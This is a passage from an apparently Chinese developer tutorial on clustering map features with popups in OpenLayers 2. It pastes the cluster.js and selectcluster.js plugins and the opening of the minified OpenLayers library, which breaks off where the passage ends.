&amp;&amp; f.cluster.length>1) ? 12 : 8; }, fcolor: function(f) { if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; } } }); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", { rendererOptions: {yOrdering: true}, styleMap: new OpenLayers.StyleMap ({ "default": style, "select": { pointRadius: 18 } }) }); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); for (var i = 0; i &lt; 200; i++) // 测试数据，替换为自己拿到的xy坐标 { var r1 = Math.random(); var r2 = Math.random(); var px = b.left + (b.right-b.left) *r1 ; var py = b.bottom + (b.top-b.bottom) *r2 ; var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(px, py), {n:i} ); features.push(f); } map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, { hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) { if (feature.cluster) feature = feature.cluster[0]; showStatus("selected feature "+feature.attributes.n+" ("+feature.id+")"); }, onUnselect: function(feature) { showStatus(""); }, }); map.addControl (ctrl); ctrl.activate(); } function showStatus(text) { document.getElementById("status").innerHTML = text; } &lt;/script> &lt;style> body { font:1em Helvetica,Arial,sans-serif; } h1 { color:#369; margin:0.5em 0 0.2em } #tags { color:#69F; font-size:0.9em; } p { margin: 0.5em 0; } p.title { color:#369; font-weight:bold; } #map { background:#fff; float:left; } #options { margin:0.5em; float:left; } #options p { margin:0 0 1em; } #docs { background:#e3e6e9; padding:0.5em; margin:0.5em 0; } .olControlAttribution { bottom:0; background:rgba(255,255,255,0.6); padding: 0 0.5em; } #status { display:block; clear:both; } &lt;/style> &lt;/head> &lt;body onload="initMap()"> &lt;!-- DIV pour la carte --> &lt;div id="map" style="width:600px; height:400px;">&lt;/div> &lt;p id="status"> &lt;/p> &lt;/body> &lt;/html> 但是由于业务需求，需要再改动一下 添加：点击地图要素，弹出其信息，点击其他区域，上一个弹窗消失： function loadJuhe(){ // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: "../../../otherlibs/ol2/img/pins.png", // 要素图标，我贴在后面，也可以用自己的 backgroundGraphic: "../../../otherlibs/ol2/img/pinsback.png", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: "${fcolor}", //"#F0C20C", fillOpacity: 1, strokeColor: "#333", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: "${label}", //labelYOffset: "${labelOffset}", fontFamily: '"Luxi sans","Lucida Grande",Lucida,"Lucida Sans Unicode",sans-serif', fontSize: "${fSize}", fontWeight : "bold", cursor:"pointer" }, { context: { label: function(f) { if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : ""; return f.attributes.n; }, labelOffset: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? "" : -8; }, fSize: function(f) { return (f.cluster &amp;&amp; f.cluster.length>1) ? 12 : 8; }, fcolor: function(f) { if (!f.cluster) return "#F0C20C"; if (f.cluster.length&lt;8) return "#AF7"; if (f.cluster.length&lt;16) return "#FD5"; return "#F97"; } } }); // New cluster Layer clayer = new OpenLayers.Layer.Cluster ("Clusters", { rendererOptions: {yOrdering: true}, styleMap: new OpenLayers.StyleMap ({ "default": style, "select": { pointRadius: 18 } }) }); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); // $iframes.videodata for (var i = 0; i &lt; $iframes.videodata.length; i++) //$iframes.videsdata是我从后台拿到的数据 { var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point($iframes.videodata[i]['x'], $iframes.videodata[i]['y']), {n:i, itemdata : $iframes.videodata[i]} ); //itemdata 是每一项的数据 features.push(f); } map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, { hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) // 弹窗 { if (feature.cluster) feature = feature.cluster[0]; ctrl.onUnselect(); var popupContentHTML=""; //弹窗的页面元素 popupContentHTML += '&lt;div id="showTradeInfo" style="width:320px;background-color:rgb(255, 255, 255);height: auto;position:relative;">'; var data = feature.data.itemdata; // 后台数据的每一项 popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;">' popupContentHTML += '&lt;label style="margin-bottom:0px;">名称&lt;/label>：&lt;label style="margin-bottom:0px;font-weight:500;">'+data['name']+'&lt;/label>' popupContentHTML += '&lt;/div>'; popupContentHTML += '&lt;div style="height:auto;line-height:36px;font-size: 14px; color: #4d4d4d;padding-left:10px;padding-right:10px; font-weight: 700;border-bottom:1px solid #ccc;">' popupContentHTML += '&lt;label style="margin-bottom:0px;">地址&lt;/label>：&lt;label style="margin-bottom:0px;font-weight:500;">'+data["address"]+'&lt;/label>' popupContentHTML += '&lt;/div>'; popupContentHTML += '&lt;/div>'; var popup = new OpenLayers.Popup.CSSFramedCloud("MyFavorites", feature.geometry.getBounds().getCenterLonLat(),// 坐标 null,// popup大小 popupContentHTML,// html内容 null,// 锚点 true,// 是否显示关闭按钮 function() {// 关闭弹窗触发该回调函数 // specialmap.removePopup(feature.popup); feature.popup.destroy(); feature.popup = null; }); popup.autoSize = true; feature.popup = popup; map.addPopup(popup); }, onUnselect: function(feature) // 取消弹窗没写 { for(var j=0; j&lt;map.popups.length; j++){ map.removePopup(map.popups[j]); j--; } // $("#clocePop").click(function(){ // removePopup(); // }); }, }); map.addControl (ctrl); ctrl.activate(); } 下面几个文件直接引用即可，直接贴出来 cluster.js /* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr * Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/) * and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). */ /** * Class: OpenLayers.Layer.Cluster * OpenLayers.Layer.Cluster is a OpenLayers.Layer.Vector with cluster stragegy and styling * * Inherits from: * - &lt;OpenLayers.Layer.Vector> */ OpenLayers.Layer.Cluster = OpenLayers.Class(OpenLayers.Layer.Vector, { /** * APIProperty: startegyParam * Properties for OpenLayers.Strategy.Cluster * and OpenLayers.Strategy.AnimatedCluster if included */ startegyParam: { /** * APIProperty: distance * {Integer} Pixel distance between features that should be considered a * single cluster. Default is 45 pixels. */ distance: 45, /** * APIProperty: animationMethod for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationMethod: OpenLayers.Easing.Expo.easeOut, /** * APIProperty: animationDuration for animated cluster if included * https://github.com/acanimal/AnimatedCluster */ animationDuration: 30 }, /** * Constructor: OpenLayers.Layer.Cluster * Create a new cluster layer * * Parameters: * name - {String} A name for the layer * options - {Object} Optional object with non-default properties to set on * the layer. Use options.startegyParam to setup cluster strategy properties. * * Returns: * {&lt;OpenLayers.Layer.Vector>} A new vector layer */ initialize: function(name, options) { if (!options) options={}; var self = this; // var smap = options.styleMap; if (!smap) { options.styleMap = smap = new OpenLayers.StyleMap (OpenLayers.Util.extend({},OpenLayers.Feature.Vector.style)); } if (!smap.styles["default"].context) smap.styles["default"].context={}; // Overload a style function overrideStyle (s,f) { var f0, v0; // is a value v0 = smap.styles["default"].defaultStyle[s]; // is a function if (v0 &amp;&amp; v0.match) f0 = v0.match(/^\$\{(.*)\}$/); if (f0) f0 = smap.styles["default"].context[f0[1]]; // Override smap.styles["default"].defaultStyle[s] = "${"+s+"}"; smap.styles["default"].context[s] = function(feature) { if (feature.cluster &amp;&amp; self.countFeaturesInCluster(feature)>1) return f(feature); else return f0 ? f0(feature) : v0 ? v0 : ""; }; smap.styles["default"].propertyStyles[s] = true; } // Overload pointRadius var pointRadius = smap.styles["default"].defaultStyle.pointRadius || 3; var minRadius = smap.styles["default"].defaultStyle.minRadius || 6; var maxRadius = smap.styles["default"].defaultStyle.maxRadius || 30; var facRadius = smap.styles["default"].defaultStyle.facRadius || 1; // overrideStyle ("pointRadius", function(feature) { return Math.min(minRadius + (feature.attributes.count-1)*facRadius,maxRadius);}); overrideStyle ("pointRadius", function(feature) { return Math.min(minRadius + (self.countFeaturesInCluster(feature)-1)*facRadius,maxRadius);}); // Overload strokeWidth overrideStyle ("strokeWidth", function(feature) { return 10; }); // Overload strokeOpacity overrideStyle ("strokeOpacity", function(feature) { return 0.5; }); // Overload strokeColor var fillColor = smap.styles["default"].defaultStyle.fillColor; var fillColorFunction = null; if (fillColor &amp;&amp; fillColor.match) { fillColorFunction = fillColor.match(/^\$\{(.*)\}$/); if (fillColorFunction) fillColorFunction = smap.styles["default"].context[fillColorFunction[1]]; } overrideStyle ("strokeColor", function(feature) { return fillColorFunction ? fillColorFunction(feature) : fillColor; }); // Overload fillOpacity overrideStyle ("fillOpacity", function(feature) { return 1; }); // Overload externalGraphic overrideStyle ("externalGraphic", function(feature) { return ""; }); // Overload externalGraphic overrideStyle ("backgroundGraphic", function(feature) { return ""; }); // Overload label overrideStyle ("label", function(feature) { return self.countFeaturesInCluster(feature); }); var strategy; if (OpenLayers.Strategy.AnimatedCluster) strategy = OpenLayers.Strategy.AnimatedCluster else strategy = OpenLayers.Strategy.Cluster; var strategy_clusters = new strategy ({ distance: this.startegyParam.distance, animationMethod: this.startegyParam.animationMethod, animationDuration: this.startegyParam.animationDuration }); this.strategy_clusters = strategy_clusters; if (options.strategies) options.strategies.push(strategy_clusters); else options.strategies = [strategy_clusters]; OpenLayers.Layer.Vector.prototype.initialize.apply(this, [name, options]); }, /** Add new feature : the standard method remove existing features */ addFeatures: function (features) { if (!this.strategy_clusters.clustering) { var f = this.strategy_clusters.features; if (f) features = features.concat(f); } OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); }, /** Refresh the layer : re-calculate the clusters */ refresh: function() { //this.strategy_clusters.clusters=null; this.strategy_clusters.resolution = 0; this.strategy_clusters.cluster(); }, /** Compact features at the same coords in a cluster to minimze number of features */ compact: function() { if (this.isCompact) return; var features = this.strategy_clusters.features; var clusters = []; var clustered; // Cluster features at the same coord for (var i=0; i&lt;features.length; i++) { feature = features[i]; if(feature.geometry) { clustered = false; for(var j=clusters.length-1; j>=0; --j) { cluster = clusters[j]; if(feature.geometry.getBounds().getCenterLonLat().equals(cluster.geometry.getBounds().getCenterLonLat())) { cluster.cluster.push(feature); cluster.attributes.count += 1; clustered = true; break; } } if (!clustered) { var center = feature.geometry.getBounds().getCenterLonLat(); var cluster = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(center.lon, center.lat), {count: 1} ); cluster.cluster = [feature]; clusters.push(cluster); } } } features = new Array(); var l = clusters.length; for (var i=0; i&lt;l; i++) { if (clusters[i].cluster &amp;&amp; clusters[i].attributes.count==1) features.push(clusters[i].cluster[0]); else features.push(clusters[i]); } // Add the new features OpenLayers.Layer.Vector.prototype.addFeatures.apply(this, [features]); this.isCompact = true; this.refresh(); }, /** Count number of feature in a cluster */ countFeaturesInCluster: function(feature) { if (feature.layer != this) return 1; if (feature.cluster) { // Normal cluster if (!this.isCompact) return feature.attributes.count; var c = 0; // Compact Cluster > count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) { c += feature.cluster[i].cluster ? feature.cluster[i].attributes.count : 1; } return c; } // No cluster else return 1; }, /** Get the features in a cluster */ getFeaturesInCluster: function(feature) { if (feature.layer != this) return [feature]; if (feature.cluster) { // Normal cluster if (!this.isCompact) return feature.cluster; var f=new Array(); // Compact Cluster > count cluster of cluster for (var i=0; i&lt;feature.cluster.length; i++) { if (feature.cluster[i].cluster) { for (k=0; k&lt;feature.cluster[i].cluster.length; k++) f.push( feature.cluster[i].cluster[k] ) } else f.push( feature.cluster[i] ); } return f; } // No cluster else return [feature]; }, /** Cluster layer */ CLASS_NAME: "OpenLayers.Layer.Cluster" }); selectcluster.js /* Copyright (c) 2014 by Jean-Marc.Viglino [at]ign.fr * Dual-licensed under the CeCILL-B Licence (http://www.cecill.info/) * and the Beerware license (http://en.wikipedia.org/wiki/Beerware), * feel free to use and abuse it in your projects (the code, not the beer ;-). */ /** * Class: OpenLayers.Control.SelectCluster * The SelectCluster control selects vector features from a given * cluster layer on click or hover. * * Inherits from: * - &lt;OpenLayers.Control.SelectFeature> */ OpenLayers.Control.SelectCluster = OpenLayers.Class(OpenLayers.Control.SelectFeature, { /** * APIProperty: connect * {Boolean} Draw connection lines to the cluster. Default is false. */ connect: false, /** * APIProperty: animate * {Boolean} Play an animation. Default is false. */ animate:false, /** * APIProperty: animationDuration * {Integer} The number of steps to be passed to the OpenLayers.Tween.start() * method when the clusters are animated. * Default is 40. */ animationDuration: 40, /** * APIProperty: pointRadius * {Number} Radius of the points in the cluster. Default is 12. */ pointRadius: 12, /** * APIProperty: circleMaxObject * {Integer} Number of points to be drawn on a circle. Default is 10 */ circleMaxObject: 10, /** * APIProperty: spiral * {Boolean} Allow to draw point on a spiral when more than circleMaxObject. Default is true */ spiral: true, /** * APIProperty: maxPoint * {Boolean} Number of points to be drawn on a spiral. Default is 60 */ maxPoint: 60, /** * Property: animationTween * {OpenLayers.Tween} Tween for animation. */ animationTween: new OpenLayers.Tween(OpenLayers.Easing.Expo.easeOut), // Initialize the SelectCluster control initialize: function(layers, options) { if (!layers.length) layers = [layers]; var smap = layers[0].styleMap; // Add a new layer to store selection this.selLayer = new OpenLayers.Layer.Vector("Selection", { displayInLayerSwitcher: false, visibility:false, // Get the yOrdering for shadow on marker rendererOptions: layers[0].rendererOptions, styleMap: smap }); // Add this layer to selection layers.push(this.selLayer); // No box selection if (options) options.box = false; OpenLayers.Control.SelectFeature.prototype.initialize.apply(this, [layers, options]); }, /** * Method: setMap * Set the map property for the control. * * Parameters: * map - {&lt;OpenLayers.Map>} */ setMap: function(map) { OpenLayers.Control.SelectFeature.prototype.setMap.apply(this, arguments); map.addLayer(this.selLayer); map.events.register('movestart', this, function(e) { //if(e.zoomChanged) { this.unselectAll(); this.selLayer.setVisibility(false); } }); map.events.register('changelayer', this, function(e) { if ( e.property == "visibility" &amp;&amp; e.layer != this.selLayer &amp;&amp; OpenLayers.Util.indexOf(this.layers,e.layer) > -1 ) this.selLayer.setVisibility(false); }); }, /** * Method: select * If the feature is a cluster spread it out in selLayer. * Otherwise, do default action. * * Parameters: * feature - {&lt;OpenLayers.Feature.Vector>} */ select: function(feature) { // Don't spread twice if (feature == this.lastCluster &amp;&amp; this.selLayer.getVisibility()) return; var count=1; var layer = feature.layer; // Spread the cluster out if (feature.cluster) { this.lastCluster = feature; // Clear the Layer this.selLayer.removeAllFeatures(); this.selLayer.setVisibility(true); if (layer &amp;&amp; layer.countFeaturesInCluster) count = layer.countFeaturesInCluster(feature); else count = feature.cluster.attributes.count; } if (count>1) { // Pixel size in map unit var pix = feature.layer.map.resolution; var cluster = new Array();; if (layer &amp;&amp; layer.getFeaturesInCluster) { cluster = layer.getFeaturesInCluster(feature); } else cluster = feature.cluster; // Draw on a circle if (!this.spiral || cluster.length &lt;= this.circleMaxObject) { var r = pix * this.pointRadius * (0.5 + cluster.length / 4); var features = new Array(); var links = new Array(); var max = Math.min(cluster.length, this.circleMaxObject); // Features on a circle for (i=0; i&lt;max; i++) { // New feature var f = cluster[i].clone(); var a = 2*Math.PI*i/max; if (max==2 || max == 4) a += Math.PI/4; if (this.animate) { f.dataAnimate = { x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+r*Math.sin(a), y1:feature.geometry.y+r*Math.cos(a) } } else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+r*Math.sin(a), feature.geometry.y+r*Math.cos(a)); // Draw connection if (this.connect) { var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push(f2); } features.push(f); } if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); } // Draw on a spiral else { // Angle de depart var a = 0; var r; var d = 2*this.pointRadius; var features = new Array(); var links = new Array(); var max = Math.min (this.maxPoint, cluster.length); // Feature on a spiral for (i=0; i&lt;max; i++) { // Nouveau rayon r = d/2 + d*a/(2*Math.PI); // Angle a = a + (d+0.1)/r; var dx = pix*r*Math.sin(a) var dy = pix*r*Math.cos(a) // New Feature var f = cluster[i].clone(); if (this.animate) { f.dataAnimate = { x0:feature.geometry.x, y0:feature.geometry.y, x1:feature.geometry.x+dx, y1:feature.geometry.y+dy } } else f.geometry = new OpenLayers.Geometry.Point (feature.geometry.x+dx, feature.geometry.y+dy); features.push(f); // Draw connection if (this.connect) { var f2 = cluster[i].clone(); f2.geometry = new OpenLayers.Geometry.LineString ( [ f.geometry , feature.geometry ]); links.push (f2); } } if (this.connect) this.selLayer.addFeatures(links); this.selLayer.addFeatures(features); } if (this.animate) { // Animation var self = this; this.animationTween.start ( {pos:0.0}, {pos:1.0}, this.animationDuration, { callbacks: { eachStep: function (delta) { self.doAnimation(delta); }, done: function (delta) { self.doAnimation(delta, true); } } } ); } } else { OpenLayers.Control.SelectFeature.prototype.select.apply(this, [feature]); } }, /** * Method: doAnimation * Calculate animation on the features in the layer. */ doAnimation: function (delta, last) { var pos = delta.pos; for (var i=0; i&lt;this.selLayer.features.length; i++) { var f = this.selLayer.features[i]; if (f.dataAnimate) { f.geometry.x = f.dataAnimate.x0 + (f.dataAnimate.x1 - f.dataAnimate.x0) *pos; f.geometry.y = f.dataAnimate.y0 + (f.dataAnimate.y1 - f.dataAnimate.y0) *pos; } if (pos==1.0) f.geometry.calculateBounds(); } this.selLayer.redraw(); }, /** * Method: clickoutFeature * Called on click outside a previously clicked (selected) feature. * Only responds if this.hover is false. * * Parameters: * feature - {&lt;OpenLayers.Vector.Feature>} */ clickoutFeature: function(feature) { if(!this.hover &amp;&amp; this.clickout) { this.selLayer.setVisibility(false); this.unselectAll(); } }, /** * Method: getSelection * Return the selected features. * * Parameters: * cluster - {Boolean} Get cluster features or original features (pay attention original features may have inconsistent layer). Default is false. */ getSelection: function(cluster) { var i, j; var sel = new Array(); for (i=0; i&lt;this.layers.length; i++) { var s = this.layers[i].selectedFeatures; for (j=0; j&lt;s.length; j++) { if (!cluster) { if (!s[j].cluster) sel.push(s[j]); else if (s[j].cluster.length == 1) sel.push(s[j].cluster[0]); } else sel.push(s[j]); } } return sel; }, CLASS_NAME: "OpenLayers.Layer.SelectCluster" }); OpenLayers.js 官方库，也可以自行下载 ，很长，但是还是放到这里吧 /* OpenLayers.js -- OpenLayers Map Viewer Library Copyright (c) 2006-2013 by OpenLayers Contributors Published under the 2-clause BSD license. See http://openlayers.org/dev/license.txt for the full text of the license, and http://openlayers.org/dev/authors.txt for full list of contributors. Includes compressed code under the following licenses: (For uncompressed versions of the code used, please see the OpenLayers Github repository: &lt;https://github.com/openlayers/openlayers>) */ /** * Contains XMLHttpRequest.js &lt;http://code.google.com/p/xmlhttprequest/> * Copyright 2007 Sergey Ilinsky (http://www.ilinsky.com) * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * http://www.apache.org/licenses/LICENSE-2.0 */ /** * OpenLayers.Util.pagePosition is based on Yahoo's getXY method, which is * Copyright (c) 2006, Yahoo! Inc. * All rights reserved. * * Redistribution and use of this software in source and binary forms, with or * without modification, are permitted provided that the following conditions * are met: * * * Redistributions of source code must retain the above copyright notice, * this list of conditions and the following disclaimer. * * * Redistributions in binary form must reproduce the above copyright notice, * this list of conditions and the following disclaimer in the documentation * and/or other materials provided with the distribution. * * * Neither the name of Yahoo! Inc. nor the names of its contributors may be * used to endorse or promote products derived from this software without * specific prior written permission of Yahoo! Inc. * * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE * POSSIBILITY OF SUCH DAMAGE. */ var OpenLayers={VERSION_NUMBER:"Release 2.13.1",singleFile:!0,_getScriptLocation:function(){for(var a=/(^|(.*?\/))(OpenLayers[^\/]*?\.js)(\?|$)/,b=document.getElementsByTagName("script"),c,d="",e=0,f=b.length;e&lt;f;e++)if(c=b[e].getAttribute("src"))if(c=c.match(a)){d=c[1];break}return function(){return d}}(),ImgPath:""};OpenLayers.Class=function(){var a=arguments.length,b=arguments[0],c=arguments[a-1],d="function"==typeof c.initialize?c.initialize:function(){b.prototype.initialize.apply(this,arguments)};1&lt;a?(a=[d,b].concat(Array.prototype.slice.call(arguments).slice(1,a-1),c),OpenLayers.inherit.apply(null,a)):d.prototype=c;return d}; OpenLayers.inherit=function(a,b){var c=function(){};c.prototype=b.prototype;a.prototype=new c;var d,e,c=2;for(d=arguments.length;c&lt;d;c++)e=arguments[c],"function"===typeof e&amp;&amp;(e=e.prototype),OpenLayers.Util.extend(a.prototype,e)};OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.extend=function(a,b){a=a||{};if(b){for(var c in b){var d=b[c];void 0!==d&amp;&amp;(a[c]=d)}"function"==typeof window.Event&amp;&amp;b instanceof window.Event||(!b.hasOwnProperty||!b.hasOwnProperty("toString"))||(a.toString=b.toString)}return a};OpenLayers.String={startsWith:function(a,b){return 0==a.indexOf(b)},contains:function(a,b){return-1!=a.indexOf(b)},trim:function(a){return a.replace(/^\s\s*/,"").replace(/\s\s*$/,"")},camelize:function(a){a=a.split("-");for(var b=a[0],c=1,d=a.length;c&lt;d;c++)var e=a[c],b=b+(e.charAt(0).toUpperCase()+e.substring(1));return b},format:function(a,b,c){b||(b=window);return a.replace(OpenLayers.String.tokenRegEx,function(a,e){for(var f,g=e.split(/\.+/),h=0;h&lt;g.length;h++){0==h&amp;&amp;(f=b);if(void 0===f)break; f=f[g[h]]}"function"==typeof f&amp;&amp;(f=c?f.apply(null,c):f());return"undefined"==typeof f?"undefined":f})},tokenRegEx:/\$\{([\w.]+?)\}/g,numberRegEx:/^([+-]?)(?=\d|\.\d)\d*(\.\d*)?([Ee]([+-]?\d+))?$/,isNumeric:function(a){return OpenLayers.String.numberRegEx.test(a)},numericIf:function(a,b){var c=a;!0===b&amp;&amp;(null!=a&amp;&amp;a.replace)&amp;&amp;(a=a.replace(/^\s*|\s*$/g,""));return OpenLayers.String.isNumeric(a)?parseFloat(a):c}}; OpenLayers.Number={decimalSeparator:".",thousandsSeparator:",",limitSigDigs:function(a,b){var c=0;0&lt;b&amp;&amp;(c=parseFloat(a.toPrecision(b)));return c},format:function(a,b,c,d){b="undefined"!=typeof b?b:0;c="undefined"!=typeof c?c:OpenLayers.Number.thousandsSeparator;d="undefined"!=typeof d?d:OpenLayers.Number.decimalSeparator;null!=b&amp;&amp;(a=parseFloat(a.toFixed(b)));var e=a.toString().split(".");1==e.length&amp;&amp;null==b&amp;&amp;(b=0);a=e[0];if(c)for(var f=/(-?[0-9]+)([0-9]{3})/;f.test(a);)a=a.replace(f,"$1"+c+"$2"); 0==b?b=a:(c=1&lt;e.length?e[1]:"0",null!=b&amp;&amp;(c+=Array(b-c.length+1).join("0")),b=a+d+c);return b},zeroPad:function(a,b,c){for(a=a.toString(c||10);a.length&lt;b;)a="0"+a;return a}}; OpenLayers.Function={bind:function(a,b){var c=Array.prototype.slice.apply(arguments,[2]);return function(){var d=c.concat(Array.prototype.slice.apply(arguments,[0]));return a.apply(b,d)}},bindAsEventListener:function(a,b){return function(c){return a.call(b,c||window.event)}},False:function(){return!1},True:function(){return!0},Void:function(){}}; OpenLayers.Array={filter:function(a,b,c){var d=[];if(Array.prototype.filter)d=a.filter(b,c);else{var e=a.length;if("function"!=typeof b)throw new TypeError;for(var f=0;f&lt;e;f++)if(f in a){var g=a[f];b.call(c,g,f,a)&amp;&amp;d.push(g)}}return d}};OpenLayers.Bounds=OpenLayers.Class({left:null,bottom:null,right:null,top:null,centerLonLat:null,initialize:function(a,b,c,d){OpenLayers.Util.isArray(a)&amp;&amp;(d=a[3],c=a[2],b=a[1],a=a[0]);null!=a&amp;&amp;(this.left=OpenLayers.Util.toFloat(a));null!=b&amp;&amp;(this.bottom=OpenLayers.Util.toFloat(b));null!=c&amp;&amp;(this.right=OpenLayers.Util.toFloat(c));null!=d&amp;&amp;(this.top=OpenLayers.Util.toFloat(d))},clone:function(){return new OpenLayers.Bounds(this.left,this.bottom,this.right,this.top)},equals:function(a){var b=!1;null!= a&amp;&amp;(b=this.left==a.left&amp;&amp;this.right==a.right&amp;&amp;this.top==a.top&amp;&amp;this.bottom==a.bottom);return b},toString:function(){return[this.left,this.bottom,this.right,this.top].join()},toArray:function(a){return!0===a?[this.bottom,this.left,this.top,this.right]:[this.left,this.bottom,this.right,this.top]},toBBOX:function(a,b){null==a&amp;&amp;(a=6);var c=Math.pow(10,a),d=Math.round(this.left*c)/c,e=Math.round(this.bottom*c)/c,f=Math.round(this.right*c)/c,c=Math.round(this.top*c)/c;return!0===b?e+","+d+","+c+","+f:d+ ","+e+","+f+","+c},toGeometry:function(){return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(this.left,this.bottom),new OpenLayers.Geometry.Point(this.right,this.bottom),new OpenLayers.Geometry.Point(this.right,this.top),new OpenLayers.Geometry.Point(this.left,this.top)])])},getWidth:function(){return this.right-this.left},getHeight:function(){return this.top-this.bottom},getSize:function(){return new OpenLayers.Size(this.getWidth(),this.getHeight())}, getCenterPixel:function(){return new OpenLayers.Pixel((this.left+this.right)/2,(this.bottom+this.top)/2)},getCenterLonLat:function(){this.centerLonLat||(this.centerLonLat=new OpenLayers.LonLat((this.left+this.right)/2,(this.bottom+this.top)/2));return this.centerLonLat},scale:function(a,b){null==b&amp;&amp;(b=this.getCenterLonLat());var c,d;"OpenLayers.LonLat"==b.CLASS_NAME?(c=b.lon,d=b.lat):(c=b.x,d=b.y);return new OpenLayers.Bounds((this.left-c)*a+c,(this.bottom-d)*a+d,(this.right-c)*a+c,(this.top-d)*a+ d)},add:function(a,b){if(null==a||null==b)throw new TypeError("Bounds.add cannot receive null values");return new OpenLayers.Bounds(this.left+a,this.bottom+b,this.right+a,this.top+b)},extend:function(a){if(a)switch(a.CLASS_NAME){case "OpenLayers.LonLat":this.extendXY(a.lon,a.lat);break;case "OpenLayers.Geometry.Point":this.extendXY(a.x,a.y);break;case "OpenLayers.Bounds":this.centerLonLat=null;if(null==this.left||a.left&lt;this.left)this.left=a.left;if(null==this.bottom||a.bottom&lt;this.bottom)this.bottom= a.bottom;if(null==this.right||a.right>this.right)this.right=a.right;if(null==this.top||a.top>this.top)this.top=a.top}},extendXY:function(a,b){this.centerLonLat=null;if(null==this.left||a&lt;this.left)this.left=a;if(null==this.bottom||b&lt;this.bottom)this.bottom=b;if(null==this.right||a>this.right)this.right=a;if(null==this.top||b>this.top)this.top=b},containsLonLat:function(a,b){"boolean"===typeof b&amp;&amp;(b={inclusive:b});b=b||{};var c=this.contains(a.lon,a.lat,b.inclusive),d=b.worldBounds;d&amp;&amp;!c&amp;&amp;(c=d.getWidth(), d=Math.round((a.lon-(d.left+d.right)/2)/c),c=this.containsLonLat({lon:a.lon-d*c,lat:a.lat},{inclusive:b.inclusive}));return c},containsPixel:function(a,b){return this.contains(a.x,a.y,b)},contains:function(a,b,c){null==c&amp;&amp;(c=!0);if(null==a||null==b)return!1;a=OpenLayers.Util.toFloat(a);b=OpenLayers.Util.toFloat(b);var d=!1;return d=c?a>=this.left&amp;&amp;a&lt;=this.right&amp;&amp;b>=this.bottom&amp;&amp;b&lt;=this.top:a>this.left&amp;&amp;a&lt;this.right&amp;&amp;b>this.bottom&amp;&amp;b&lt;this.top},intersectsBounds:function(a,b){"boolean"===typeof b&amp;&amp;(b= {inclusive:b});b=b||{};if(b.worldBounds){var c=this.wrapDateLine(b.worldBounds);a=a.wrapDateLine(b.worldBounds)}else c=this;null==b.inclusive&amp;&amp;(b.inclusive=!0);var d=!1,e=c.left==a.right||c.right==a.left||c.top==a.bottom||c.bottom==a.top;if(b.inclusive||!e)var d=a.top>=c.bottom&amp;&amp;a.top&lt;=c.top||c.top>a.bottom&amp;&amp;c.top&lt;a.top,e=a.left>=c.left&amp;&amp;a.left&lt;=c.right||c.left>=a.left&amp;&amp;c.left&lt;=a.right,f=a.right>=c.left&amp;&amp;a.right&lt;=c.right||c.right>=a.left&amp;&amp;c.right&lt;=a.right,d=(a.bottom>=c.bottom&amp;&amp;a.bottom&lt;=c.top||c.bottom>= a.bottom&amp;&amp;c.bottom&lt;=a.top||d)&amp;&amp;(e||f);if(b.worldBounds&amp;&amp;!d){var g=b.worldBounds,e=g.getWidth(),f=!g.containsBounds(c),g=!g.containsBounds(a);f&amp;&amp;!g?(a=a.add(-e,0),d=c.intersectsBounds(a,{inclusive:b.inclusive})):g&amp;&amp;!f&amp;&amp;(c=c.add(-e,0),d=a.intersectsBounds(c,{inclusive:b.inclusive}))}return 